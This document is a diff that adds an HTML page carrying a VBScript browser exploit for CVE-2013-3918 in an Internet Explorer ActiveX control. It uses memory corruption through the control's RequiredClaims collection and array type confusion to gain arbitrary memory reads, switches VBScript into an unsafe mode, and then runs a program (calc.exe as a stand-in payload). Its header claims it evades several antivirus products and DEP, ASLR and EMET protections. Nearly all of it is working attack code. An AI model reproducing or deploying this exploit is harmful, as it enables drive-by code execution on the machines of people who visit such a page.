@@ -1,0 +1,353 @@
+<!doctype html>
+
+<html>
+
+<head>
+
+</head>
+
+<body>
+
+
+
+
+<p> cve_2013_3918 for http://xp.erangelab.com/ version.bypass baidu\jinshan\bxy...<p>
+
+<p> exp for xp\win2k\win2003\vista\win7\win8.1.<p> 
+
+<p> dve copy by yuange1975 in 2009, anti dep+aslr+emet+cfi.<p>  
+
+<p> win7 del HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{19916E01-B44E-4E31-94A4-4696DF46157B}]  "Compatibility 
+
+
+
+
+Flags"=dword:04000400 <p>
+
+
+
+
+
+
+
+<SCRIPT LANGUAGE="VBScript">
+
+
+
+
+function runmuma() 
+
+ On Error Resume Next
+
+ set WshShell = CreateObject("WScript.Shell")
+
+ wexec=""
+
+ set wexec=WshShell.run("calc.exe")
+
+set file = CreateObject("Scripting.FileSystemObject")
+
+'msgbox "ftp your file."
+
+end function
+
+</script>
+
+
+
+
+<SCRIPT LANGUAGE="VBScript">
+
+  On Error Resume Next
+
+  set  obj=document.CreateElement("object")
+
+  obj.classid="clsid:19916E01-B44E-4E31-94A4-4696DF46157B" 
+
+  Set Req = obj.RequiredClaims
+
+  dim  a(300)
+
+  dim  i,j
+
+  dim add
+
+  dim num
+
+  dim vbadd
+
+  //add=&h010f00      
+
+  num=200
+
+
+
+
+  Begin()
+
+ // msgbox j
+
+  setnotsafemode()
+
+
+
+
+function Begin()
+
+  On Error Resume Next
+
+  dim i
+
+  myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
+
+  myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)
+
+  mystr=chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
+
+
+
+
+  For i=0 to num
+
+    a(i)= Array(0.0,0.0,myarray,0.0,9.52510864539202e-307) 
+
+  Next  
+
+ 
+
+  For i=num-50 to num-10
+
+    a(i)=0
+
+  Next  
+
+ 
+
+  For i=0 to 11
+
+    Req.add(CStr(i))
+
+  Next
+
+  
+
+  For i=num-50 to num+99
+
+    a(i)= Array(0.0,0.0,myarray,0.0,9.52510864539202e-307) 
+
+  Next  
+
+
+
+
+  For i=Req.length to 0 step -1
+
+     Req.remove(CLng(i))
+
+  Next
+
+
+
+
+  For i=-1  to -1000 step  -1  
+
+     Req.remove(CLng(i))
+
+
+
+
+     For j=num+99 to  0  step -1    
+
+       if ( a(j)(4) <1.0e-307) Then      
+
+                  
+
+                   Req.add("a")
+
+                   Req.add("b")
+
+                   a(j)(4)=mystr                   
+
+                   Req.remove(CLng(i-18))              
+
+                   Req.remove(CLng(i-18))
+
+                   Req.add("c")
+
+                   Req.add("d")
+
+            
+
+                   a(j)(0)=0.0 
+
+                   a(j)(1)=1.74088534731324E-310
+
+                   a(j)(3)=6.36598737437801E-314
+
+   
+
+                   Req.remove(CLng(i-18))
+
+                   Req.remove(CLng(i-18))
+
+                
+
+                   add=a(j)(3)+16
+
+       
+
+                   i=-1000
+
+                   exit for 
+
+        End if       
+
+    Next    
+
+ Next 
+
+                      
+
+ For i=Req.length to 0 
+
+     Req.add(Cstr(i))
+
+ Next
+
+end function
+
+
+
+
+sub testaa()
+
+end sub
+
+function mydata()
+
+    On Error Resume Next
+
+    i=testaa
+
+    i=null  
+
+    a(j)(1)(add)=0
+
+    a(j)(1)(add)=i
+
+    a(j)(1)(add-8)=3
+
+    mydata=a(j)(1)(add)
+
+end function 
+
+
+
+
+function setnotsafemode()
+
+    On Error Resume Next
+
+    i=mydata()  
+
+    vbadd=readmemo(i)  
+
+    i=readmemo(i+8)
+
+    i=readmemo(i+16)  
+
+    mode=readmemo(i+&h134)   
+
+   
+
+    for k=0 to &h60 step 4
+
+        mode=readmemo(i+&h120+k)               
+
+        if(mode=14) then
+
+           mode=0          
+
+  a(j)(1)(i+&h11c+k)=a(j)(1)(add-16)
+
+  mode=0 
+
+           mode=readmemo(i+&h120+k)
+
+           Exit for
+
+        end if
+
+    next
+
+  
+
+    fuckhook()
+
+    reset()
+
+    runmuma() 
+
+end function
+
+
+
+
+function ReadMemo(mem) 
+
+    On Error Resume Next
+
+    a(j)(1)(add)=0   
+
+    a(j)(1)(add)=mem+4     
+
+    a(j)(1)(add-8)=8       
+
+    ReadMemo=lenb(a(j)(1)(add))  
+
+    a(j)(1)(add-8)=0             
+
+end function
+
+
+
+
+function fuckhook() 
+
+    On Error Resume Next
+
+    memadd=vbadd and &hffff0000
+
+//* 摘除钩子、自由发挥 anti tx and bxy *// 
+
+end function
+
+
+
+
+function reset() 
+
+    On Error Resume Next   
+
+    a(j)(1)(add-8)=6.36598737437801E-314
+
+    a(j)(4)=0   
+
+    a(j)(3)=0     
+
+    a(j)(2)=0          
+
+   ' a(j)(1)=0
+
+//* 恢复变量、修复内存管理结构，保证不崩。擂台赛版本，未做。 *//        
+
+end function
+
+</script>
+
+
+
+
+</body>
+
+</html>
